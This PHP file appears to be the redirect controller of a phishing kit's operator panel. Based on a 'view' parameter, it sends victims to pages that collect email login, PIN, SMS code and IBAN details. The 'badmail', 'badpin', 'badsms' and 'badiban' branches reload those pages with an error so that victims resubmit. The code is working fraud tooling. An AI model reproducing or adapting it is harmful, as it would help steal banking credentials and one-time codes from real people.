<?php 

require "Config/panel.php";

    update();

    if ($_GET['view'] == 'mail' ) {
        header("Location: mail.php?id={$id}&ue={$ue}");
        exit();
        
    }
    else if( $_GET['view'] == 'badmail' ) {

        header("Location: mail.php?page=error&id={$id}&ue={$ue}");
        exit();
        
    }
    else if( $_GET['view'] == 'pin' ) {

        header("Location: pin.php?id={$id}&ue={$ue}");
        exit();
        
    }
    else if( $_GET['view'] == 'badpin' ) {

        header("Location: pin.php?page=error&id={$id}&ue={$ue}");
        exit();
        
    }
    else if( $_GET['view'] == 'sms' ) {

        header("Location: sms.php?id={$id}&ue={$ue}");
        exit();
        
    }
    else if( $_GET['view'] == 'badsms' ) {

        header("Location: sms.php?page=error&id={$id}&ue={$ue}");
        exit();
        
    }
    else if( $_GET['view'] == 'iban' ) {

        header("Location: iban.php?id={$id}&ue={$ue}");
        exit();
        
    }
    else if( $_GET['view'] == 'badiban' ) {

        header("Location: iban.php?page=error&id={$id}&ue={$ue}");
        exit();
        
    }
    else if( $_GET['view'] == 'confirm' ) {

        header("Location: confirm.php?id={$id}&ue={$ue}");
        exit();
        
    } 
exit();